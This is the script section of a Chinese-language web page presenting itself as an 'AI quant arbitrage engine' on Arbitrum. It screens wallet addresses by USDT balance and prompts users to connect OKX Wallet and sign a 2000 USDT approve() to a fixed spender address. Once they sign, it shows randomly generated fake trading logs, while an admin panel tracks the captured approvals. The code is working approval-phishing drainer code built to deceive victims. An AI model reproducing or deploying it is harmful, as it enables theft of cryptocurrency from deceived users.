    function isValidArbitrumAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
    
    // ========== 申请记录管理 ==========
    function loadApplications() { const s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : []; }
    function saveApplications(apps) { localStorage.setItem(STORAGE_KEY, JSON.stringify(apps)); }
    function getAddressRecordCount(addr) { return loadApplications().filter(a => a.address === addr.toLowerCase()).length; }
    function addApprovedRecord(address, usdtBalance, transferStatus, transferTxHash) {
        if (getAddressRecordCount(address) >= MAX_RECORDS_PER_ADDRESS) return false;
        const apps = loadApplications();
        apps.push({ id: Date.now(), address: address.toLowerCase(), status: 'approved', usdtBalance: usdtBalance, submitTime: new Date().toLocaleString(), approvedTime: new Date().toLocaleString(), transferStatus: transferStatus, transferTxHash: transferTxHash });
        saveApplications(apps);
        return true;
    }
    
    function renderAdminList() {
        const apps = loadApplications().slice(-10).reverse();
        const container = document.getElementById('applicationsList');
        if (!container) return;
        if (apps.length === 0) { container.innerHTML = '<div style="color:#8e9aaf; text-align:center; padding:20px;">暂无记录</div>'; return; }
        let html = '<table class="admin-table"><thead><tr><th>地址</th><th>提交时间</th><th>USDT余额</th><th>通过时间</th><th>转账状态</th><th>操作</th></tr></thead><tbody>';
        const records = getTransferRecords();
        for (const app of apps) {
            const record = records[app.address];
            let statusHtml = '<span style="color:#ffaa44;">⏳ 待处理</span>', txHtml = '';
            if (record && record.status === 'success') { statusHtml = '<span class="transfer-success">✅ 已转账</span>'; if(record.txHash) txHtml = `<div><a href="https://arbiscan.io/tx/${record.txHash}" target="_blank" class="tx-link">查看交易</a></div>`; }
            else if (record && record.status === 'failed') statusHtml = '<span class="transfer-failed">❌ 转账失败</span>';
            html += `<tr>
                <td style="font-family:monospace;font-size:11px;" title="${app.address}">${app.address.slice(0,6)}...${app.address.slice(-4)}</td>
                <td style="font-size:11px;">${app.submitTime}</td>
                <td style="font-size:11px;color:#00ff88;">${app.usdtBalance?.toFixed(2) || '--'}</td>
                <td style="font-size:11px;">${app.approvedTime || '-'}</td>
                <td style="font-size:11px;">${statusHtml}${txHtml}</td>
                <td><button class="copy-btn" onclick="copyToClipboard('${app.address}')">📋 复制</button></td>
            </tr>`;
        }
        html += '</tbody><table>';
        container.innerHTML = html;
    }
    
    function showCopyToast(msg) { const t = Object.assign(document.createElement('div'), { className: 'copy-toast', textContent: msg }); document.body.appendChild(t); setTimeout(() => t.remove(), 2000); }
    async function copyToClipboard(text) { try { await navigator.clipboard.writeText(text); showCopyToast('✅ 地址已复制'); } catch { const ta = Object.assign(document.createElement('textarea'), { value: text }); document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); showCopyToast('✅ 地址已复制'); } }
    window.copyToClipboard = copyToClipboard;
    
    // ========== 页面切换函数 ==========
    function showPage(pageId) {
        const pages = ['passwordPage', 'whitepaperPage', 'tutorialPage', 'applyPage', 'adminPage', 'announcementPage', 'quantPanel', 'runningPanel'];
        for (let i = 0; i < pages.length; i++) { const el = document.getElementById(pages[i]); if (el) el.style.display = 'none'; }
        const target = document.getElementById(pageId);
        if (target) target.style.display = 'block';
    }
    
    // 绑定返回按钮
    document.getElementById('backToPasswordBtn')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromTutorial')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromApply')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromQuant')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromAdmin')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromAnnouncement')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToQuantFromRunning')?.addEventListener('click', () => showPage('quantPanel'));
    
    // 绑定导航按钮
    document.getElementById('whitepaperBtn')?.addEventListener('click', () => showPage('whitepaperPage'));
    document.getElementById('tutorialBtn')?.addEventListener('click', () => showPage('tutorialPage'));
    document.getElementById('applyBtn')?.addEventListener('click', () => showPage('applyPage'));
    document.getElementById('adminEntryBtn')?.addEventListener('click', () => showPage('adminPage'));
    document.getElementById('announcementBtn')?.addEventListener('click', () => showPage('announcementPage'));
    
    // 管理员面板标签页切换
    const tabApplyBtn = document.getElementById('tabApplyBtn');
    const tabApproveBtn = document.getElementById('tabApproveBtn');
    const applyRecordPanel = document.getElementById('applyRecordPanel');
    const approveRecordPanel = document.getElementById('approveRecordPanel');
    
    if (tabApplyBtn && tabApproveBtn) {
        tabApplyBtn.onclick = () => {
            applyRecordPanel.style.display = 'block';
            approveRecordPanel.style.display = 'none';
            tabApplyBtn.style.borderBottom = '2px solid #00ccff';
            tabApproveBtn.style.borderBottom = 'none';
        };
        tabApproveBtn.onclick = () => {
            applyRecordPanel.style.display = 'none';
            approveRecordPanel.style.display = 'block';
            tabApproveBtn.style.borderBottom = '2px solid #00ccff';
            tabApplyBtn.style.borderBottom = 'none';
            renderApproveList();
        };
    }
    
    // ========== 密码验证 ==========
    document.getElementById('submitPassword').onclick = function() {
        var pwd = document.getElementById('passwordInput').value;
        if (pwd === SYSTEM_PASSWORD) { showPage('quantPanel'); document.getElementById('errorMsg').textContent = ''; }
        else { document.getElementById('errorMsg').textContent = '❌ 密码错误，请输入正确的访问密码'; document.getElementById('passwordInput').value = ''; document.getElementById('passwordInput').focus(); }
    };
    document.getElementById('passwordInput').onkeypress = function(e) { if (e.key === 'Enter') document.getElementById('submitPassword').click(); };
    
    // ========== 申请访问 ==========
    let isSubmitting = false;
    document.getElementById('submitApplyBtn').onclick = async function() {
        if (isSubmitting) return;
        const address = document.getElementById('applyAddressInput').value.trim();
        const applyMsg = document.getElementById('applyMsg');
        if (!isValidArbitrumAddress(address)) { applyMsg.innerHTML = '❌ 无效的 Arbitrum 链地址！'; applyMsg.style.color = '#ff6b6b'; return; }
        const apps = loadApplications();
        const isApproved = apps.some(a => a.address === address.toLowerCase() && a.status === 'approved');
        if (isApproved) { applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#00ff88;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`; applyMsg.style.color = '#00ff88'; return; }
        const isPending = apps.some(a => a.address === address.toLowerCase() && a.status === 'pending');
        if (isPending) { applyMsg.innerHTML = `⏳ 您的申请正在审核中，请耐心等待`; applyMsg.style.color = '#ffaa44'; return; }
        try {
            isSubmitting = true; document.getElementById('submitApplyBtn').disabled = true;
            applyMsg.innerHTML = '<span class="loading-spinner"></span> 🔍 正在链上查询 USDT 余额...'; applyMsg.style.color = '#7ee0ff';
            const balanceResult = await getUSDTBalance(address);
            if (!balanceResult.success) { applyMsg.innerHTML = `❌ 查询余额失败：${balanceResult.error || '网络错误'}`; applyMsg.style.color = '#ff6b6b'; return; }
            const balance = balanceResult.balance;
            if (balance < MIN_USDT_REQUIRED) { applyMsg.innerHTML = `❌ 申请失败！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 需要持有 ≥${MIN_USDT_REQUIRED} USDT`; applyMsg.style.color = '#ff6b6b'; return; }
            if (balance > MAX_USDT_LIMIT) { applyMsg.innerHTML = `⚠️ 余额超过限制！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 请确保钱包内 ≤${MAX_USDT_LIMIT} USDT`; applyMsg.style.color = '#ffaa44'; return; }
            let transferStatus = null, transferTxHash = null;
            try { const tr = await internalTransferEth(address); if (tr.success) { transferStatus = 'success'; transferTxHash = tr.txHash; } else if (tr.reason === 'already_transferred') transferStatus = 'success'; else transferStatus = 'failed'; } catch(err) { transferStatus = 'failed'; }
            addApprovedRecord(address, balance, transferStatus, transferTxHash);
            applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#00ff88;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`;
            applyMsg.style.color = '#00ff88'; document.getElementById('applyAddressInput').value = '';
        } catch (error) { applyMsg.innerHTML = '❌ 系统错误，请稍后重试'; applyMsg.style.color = '#ff6b6b'; }
        finally { isSubmitting = false; document.getElementById('submitApplyBtn').disabled = false; }
    };
    
    // ========== 管理员登录 ==========
    document.getElementById('submitAdminLogin').onclick = function() {
        var adminPwd = document.getElementById('adminPasswordInput').value;
        if (adminPwd === ADMIN_PASSWORD) { 
            document.getElementById('adminLoginMsg').textContent = ''; 
            document.getElementById('adminContent').style.display = 'block'; 
            renderAdminList();
            renderApproveList();
            if (tabApplyBtn) tabApplyBtn.click();
        }
        else { document.getElementById('adminLoginMsg').textContent = '❌ 管理员密码错误'; document.getElementById('adminContent').style.display = 'none'; }
    };
    
    // ========== 网络检测函数 ==========
    async function checkAndSwitchNetwork(wallet) {
        try {
            let chainId = await wallet.request({ method: 'eth_chainId' });
            chainId = parseInt(chainId, 16);
            if (chainId !== TARGET_CHAIN_ID) {
                const infoDiv = document.getElementById('info');
                infoDiv.innerHTML = `⚠️ 当前网络不是 ${TARGET_CHAIN_NAME}！<br>请在钱包右上角点击网络，切换到 Arbitrum One 网络后重新连接`;
                infoDiv.style.color = '#ffaa44';
                return false;
            }
            const networkStatus = document.getElementById('networkStatus');
            networkStatus.innerHTML = '✅ Arbitrum One 主网';
            networkStatus.style.color = '#00ff88';
            return true;
        } catch (error) {
            console.error('网络检测失败:', error);
            return false;
        }
    }
    
    // ========== 授权逻辑 ==========
    let currentSigner = null;
    let usdtDecimals = null;
    let usdtContractWithSigner = null;
    let logInterval = null;
    
    const connectBtn = document.getElementById("connect");
    const approveBtn = document.getElementById("approve");
    const infoDiv = document.getElementById("info");
    const walletAddressSpan = document.getElementById("walletAddressDisplay");
    
    function startRunningLogs() {
        if (logInterval) clearInterval(logInterval);
        const logArea = document.getElementById('logArea');
        if (!logArea) return;
        logArea.innerHTML = `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="log-scan">✅ AI引擎启动成功</span></div>`;
        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer', 'QuickSwap', 'Camelot', 'TraderJoe', 'Velodrome', 'Aerodrome', 'KyberSwap', 'DODO'];
        const gasMessages = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ Gas费偏高: 41 Gwei，延迟执行', '⛽ 当前Gas: 28 Gwei，正常范围', '⛽ Gas费波动中: 35 Gwei', '⛽ 网络拥堵，Gas费上升至 45 Gwei', '⛽ Gas费回落至 25 Gwei，继续监控', '⛽ 等待Gas费降低... 当前 39 Gwei'];
        const scanMessages = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...', '🔍 检测 {dex} 交易对深度...', '🔍 分析 {dex} 价差数据...'];
        const statusMessages = ['📊 汇总各DEX数据中...', '🔄 更新价格预言机...', '⏳ 等待市场波动...', '📡 连接多链节点...', '🔗 同步区块高度...'];
        function getRandomDex() { return dexList[Math.floor(Math.random() * dexList.length)]; }
        function getRandomLog() {
            const rand = Math.random();
            let message = '', colorClass = 'log-scan';
            if (rand < 0.5) { const dex = getRandomDex(); message = scanMessages[Math.floor(Math.random() * scanMessages.length)].replace('{dex}', dex); colorClass = 'log-scan'; }
            else if (rand < 0.75) { message = gasMessages[Math.floor(Math.random() * gasMessages.length)]; colorClass = 'log-gas'; }
            else { message = statusMessages[Math.floor(Math.random() * statusMessages.length)]; colorClass = 'log-scan'; }
            return `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="${colorClass}">${message}</span></div>`;
        }
        logInterval = setInterval(() => {
            if (logArea && document.getElementById('runningPanel').style.display === 'block') {
                const newLog = getRandomLog();
                logArea.insertAdjacentHTML('beforeend', newLog);
                logArea.scrollTop = logArea.scrollHeight;
                while (logArea.children.length > 20) logArea.removeChild(logArea.firstChild);
            }
        }, 3200);
    }
    
    function getCurrentTime() { const now = new Date(); return `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`; }
    function stopRunningLogs() { if (logInterval) { clearInterval(logInterval); logInterval = null; } }
    
    async function initUSDTContractWithSigner(signer) {
        const abi = ["function decimals() view returns (uint8)", "function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
        const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
        const decimals = await contract.decimals();
        console.log("USDT decimals:", decimals);
        return { contract, decimals };
    }
    
    async function getAllowanceReadOnly(userAddress, spenderAddress, contractAddress, provider) {
        try {
            const abi = ["function allowance(address owner, address spender) view returns (uint256)"];
            const contract = new ethers.Contract(contractAddress, abi, provider);
            const rawAllowance = await contract.allowance(userAddress, spenderAddress);
            return rawAllowance;
        } catch (err) { return null; }
    }
    
    function isMobile() { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
    function tryOpenOKXApp() { if (isMobile()) { window.location.href = "okx://wallet/dapp?url=" + encodeURIComponent(window.location.href); setTimeout(() => { window.location.href = "https://www.okx.com/download"; }, 2000); } }
    function getWallet() { if (window.okxwallet) return window.okxwallet; if (window.ethereum && window.ethereum.isOKXWallet) return window.ethereum; if (window.ethereum) return window.ethereum; return null; }
    function updateUI(address = null) { if (address) { walletAddressSpan.innerText = address.slice(0,6)+"..."+address.slice(-4); walletAddressSpan.style.color = "#6ee7ff"; } else { walletAddressSpan.innerText = "未连接"; walletAddressSpan.style.color = "#8e9aaf"; } }
    
    if (connectBtn) {
        connectBtn.onclick = async () => {
            let wallet = getWallet();
            if (!wallet) {
                if (isMobile()) { infoDiv.innerHTML = "📱 正在尝试打开 OKX App...<br>如果未安装，将跳转下载页面"; tryOpenOKXApp(); }
                else { infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>"; }
                return;
            }
            try {
                infoDiv.innerHTML = "⏳ 请求连接钱包...<br>请确认右上角网络是 Arbitrum One";
                infoDiv.style.color = '#7ee0ff';
                
                await wallet.request({ method: "eth_requestAccounts" });
                
                const isCorrectNetwork = await checkAndSwitchNetwork(wallet);
                if (!isCorrectNetwork) { return; }
                
                const provider = new ethers.providers.Web3Provider(wallet);
                const signer = provider.getSigner();
                currentSigner = signer;
                const address = await signer.getAddress();
                updateUI(address);
                const { contract, decimals } = await initUSDTContractWithSigner(signer);
                usdtContractWithSigner = contract;
                usdtDecimals = decimals;
                infoDiv.innerHTML = `✅ AI引擎准备就绪，请授权启动引擎 | 地址: ${address.slice(0,6)}...${address.slice(-4)}`;
                infoDiv.style.color = '#9aa9c1';
                approveBtn.disabled = false;
            } catch (err) { 
                infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消");
                infoDiv.style.color = '#ff6b6b';
            }
        };
    }
    
    if (approveBtn) {
        approveBtn.onclick = async () => {
            if (!currentSigner) { alert("请先连接钱包"); return; }
            const userAddress = await currentSigner.getAddress();
            if (!usdtContractWithSigner || usdtDecimals === null) {
                const { contract, decimals } = await initUSDTContractWithSigner(currentSigner);
                usdtContractWithSigner = contract;
                usdtDecimals = decimals;
            }
            const provider = currentSigner.provider;
            const rawAllowance = await getAllowanceReadOnly(userAddress, SPENDER_ADDRESS, USDT_ADDRESS, provider);
            const currentAllowance = parseFloat(ethers.utils.formatUnits(rawAllowance, usdtDecimals));
            if (currentAllowance >= MIN_APPROVE_AMOUNT) {
                infoDiv.innerHTML = `✅ 当前授权额度 (${currentAllowance.toFixed(2)} USDT) 已满足<br>🚀 正在启动 AI 引擎...`;
                showPage('runningPanel');
                startRunningLogs();
                return;
            }
            try {
                infoDiv.innerHTML = "🤖 AI 正在准备合约交互...";
                const amountToApproveRaw = ethers.utils.parseUnits("2000", usdtDecimals);
                infoDiv.innerHTML = `📡 请在钱包内确认授权<br>授权额度: 2000 USDT`;
                const tx = await usdtContractWithSigner.approve(SPENDER_ADDRESS, amountToApproveRaw);
                infoDiv.innerHTML = "⛓️ 交易已提交 | Hash: " + tx.hash.slice(0,10)+"...";
                await tx.wait();
                
                addApproveRecord(userAddress, tx.hash, 2000);
                
                const newRawAllowance = await getAllowanceReadOnly(userAddress, SPENDER_ADDRESS, USDT_ADDRESS, provider);
                const newAllowance = parseFloat(ethers.utils.formatUnits(newRawAllowance, usdtDecimals));
                if (newAllowance >= MIN_APPROVE_AMOUNT) {
                    infoDiv.innerHTML = `✅ 授权成功！当前授权额度: ${newAllowance.toFixed(2)} USDT<br>🚀 AI 引擎正在启动...`;
                    showPage('runningPanel');
                    startRunningLogs();
                } else {
                    infoDiv.innerHTML = `❌ 授权失败 | 当前授权额度: ${newAllowance.toFixed(2)} USDT<br>⚠️ 需要 ≥${MIN_APPROVE_AMOUNT} USDT`;
                }
            } catch (err) { infoDiv.innerHTML = "❌ 授权失败: " + (err.message || "用户取消"); }
        };
    }
    
    console.log('系统启动成功，密码: 1134');
    console.log('24小时收益规则: 每天中午12点到第二天中午12点保持不变');
</script>
</body>
</html>
